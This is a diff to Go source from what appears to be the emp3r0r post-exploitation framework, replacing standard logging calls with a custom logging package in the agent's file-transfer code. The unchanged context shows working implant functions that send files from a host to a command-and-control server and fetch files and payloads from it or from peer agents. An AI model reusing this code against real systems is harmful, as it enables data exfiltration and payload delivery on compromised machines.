@@ -5,7 +5,7 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net/http"
 	"net/url"
 	"os"
@@ -29,7 +29,7 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 	if util.IsFileExist(path) {
 		// check checksum
 		if crypto.SHA256SumFile(path) == checksum {
-			log.Printf("SmartDownload: %s already exists and checksum matches", path)
+			logging.Printf("SmartDownload: %s already exists and checksum matches", path)
 			return
 		}
 	}
@@ -37,12 +37,12 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 	// if download_host is given, download from the specified agent
 	if download_addr != "" {
 		// download from other agent
-		log.Printf("SmartDownload: downloading from %s", download_addr)
+		logging.Printf("SmartDownload: downloading from %s", download_addr)
 		err = DownloadFromPeerKCP(download_addr, file_to_download, path, checksum)
 		if util.IsFileExist(path) {
 			// checksum
 			if crypto.SHA256SumFile(path) == checksum {
-				log.Printf("SmartDownload: %s downloaded via TCP and checksum matches", path)
+				logging.Printf("SmartDownload: %s downloaded via TCP and checksum matches", path)
 			}
 		}
 		return nil, err
@@ -56,11 +56,11 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err error) {
 	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
 		def.CCAddress, transport.DownloadFile2AgentAPI, url.QueryEscape(common.RuntimeConfig.AgentUUID), url.QueryEscape(file_to_download))
-	log.Printf("DownloadViaCC is downloading from %s", url)
+	logging.Printf("DownloadViaCC is downloading from %s", url)
 	retData := false
 	if path == "" {
 		retData = true
-		log.Printf("No path specified, will return []byte")
+		logging.Printf("No path specified, will return []byte")
 	}
 	lock := fmt.Sprintf("%s.lock", path)
 	if util.IsFileExist(lock) {
@@ -75,7 +75,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 
 	// if no path specified
 	if retData {
-		log.Printf("Downloading %s to memory", url)
+		logging.Printf("Downloading %s to memory", url)
 		client := def.HTTPClient
 		if client == nil {
 			err = fmt.Errorf("failed to initialize HTTP client")
@@ -110,7 +110,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 	}
 
 	// use grab
-	log.Printf("Downloading %s to %s", url, path)
+	logging.Printf("Downloading %s to %s", url, path)
 	client := grab.NewClient()
 	client.HTTPClient = def.HTTPClient
 	if client.HTTPClient == nil {
@@ -144,17 +144,17 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 			err = resp.Err()
 			if err != nil {
 				err = fmt.Errorf("finished with error: %v", err)
-				log.Print(err)
+				logging.Print(err)
 				return
 			}
 			if checksum != crypto.SHA256SumFile(path) {
 				err = fmt.Errorf("checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
 				return
 			}
-			log.Printf("saved %s to %s (%d bytes)", url, path, resp.Size())
+			logging.Printf("saved %s to %s (%d bytes)", url, path, resp.Size())
 			return
 		case <-t.C:
-			log.Printf("%.02f%% complete", resp.Progress()*100)
+			logging.Printf("%.02f%% complete", resp.Progress()*100)
 		}
 	}
 
@@ -164,7 +164,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 // SendFile2CC send file to CC, with buffering
 // using FTP API
 func SendFile2CC(filepath string, offset int64, token string) (err error) {
-	log.Printf("Sending %s to CC, offset=%d", filepath, offset)
+	logging.Printf("Sending %s to CC, offset=%d", filepath, offset)
 	// open and read the target file
 	f, err := os.Open(filepath)
 	if err != nil {
@@ -186,7 +186,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 		transport.Upload2AgentAPI,
 		token)
 	conn, _, _, err := ConnectCC(url)
-	log.Printf("connection: %s", url)
+	logging.Printf("connection: %s", url)
 	if err != nil {
 		err = fmt.Errorf("connection failed: %v", err)
 		return
@@ -204,7 +204,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	freader := bufio.NewReader(f)
 	n, err := io.Copy(compressor, freader)
 	if err != nil {
-		log.Printf("failed, %d bytes transfered: %v", n, err)
+		logging.Printf("failed, %d bytes transfered: %v", n, err)
 	}
 	return
 }
@@ -240,12 +240,12 @@ func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err e
 		server.Close()
 	}()
 
-	log.Printf("HTTP secure file server started on port %d", port)
+	logging.Printf("HTTP secure file server started on port %d", port)
 	err = server.ListenAndServe()
 	if err != nil && err != http.ErrServerClosed {
 		return fmt.Errorf("FileServer: failed to start HTTP server: %v", err)
 	}
-	log.Printf("FileServer on %d exited", port)
+	logging.Printf("FileServer on %d exited", port)
 	return nil
 }
 
@@ -256,10 +256,10 @@ func handleClient(w http.ResponseWriter, r *http.Request) {
 	download_path := fmt.Sprintf("%s/%s", common.RuntimeConfig.AgentRoot, util.FileBaseName(file_path))
 	// if file does not exist, download it from CC
 	if !util.IsFileExist(file_path) {
-		log.Printf("handleClient: file %s (%s) does not exist, downloading from CC", file_path, checksum)
+		logging.Printf("handleClient: file %s (%s) does not exist, downloading from CC", file_path, checksum)
 		_, err := DownloadViaC2(file_path, download_path, checksum)
 		if err != nil {
-			log.Printf("handleClient: failed to download file from CC: %v", err)
+			logging.Printf("handleClient: failed to download file from CC: %v", err)
 			http.Error(w, "Failed to download file from CC", http.StatusInternalServerError)
 			return
 		}
@@ -281,7 +281,7 @@ func DownloadFromPeerKCP(address, filepath, path, checksum string) (err error) {
 
 	// wait until port is open
 	for !netutil.IsPortOpen("127.0.0.1", kcp_listen_port) {
-		log.Printf("RequestAndDownloadFile: waiting for port %s to open", kcp_listen_port)
+		logging.Printf("RequestAndDownloadFile: waiting for port %s to open", kcp_listen_port)
 		time.Sleep(time.Second)
 	}
 
@@ -310,10 +310,10 @@ func DownloadFromPeerKCP(address, filepath, path, checksum string) (err error) {
 					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
 				}
 			}
-			log.Printf("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, resp.Size())
+			logging.Printf("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, resp.Size())
 			return nil
 		case <-t.C:
-			log.Printf("%.02f%% complete at %.02f KB/s", resp.Progress()*100, resp.BytesPerSecond()/1024)
+			logging.Printf("%.02f%% complete at %.02f KB/s", resp.Progress()*100, resp.BytesPerSecond()/1024)
 		}
 	}
 
@@ -328,9 +328,9 @@ func CancelFileTransfer(clientAddr, filepath string) {
 
 	if cancel, exists := AgentFileTransferSessions[sessionID]; exists {
 		cancel()
-		log.Printf("File transfer session for %s canceled", sessionID)
+		logging.Printf("File transfer session for %s canceled", sessionID)
 		delete(AgentFileTransferSessions, sessionID)
 	} else {
-		log.Printf("No active file transfer session for %s", sessionID)
+		logging.Printf("No active file transfer session for %s", sessionID)
 	}
 }
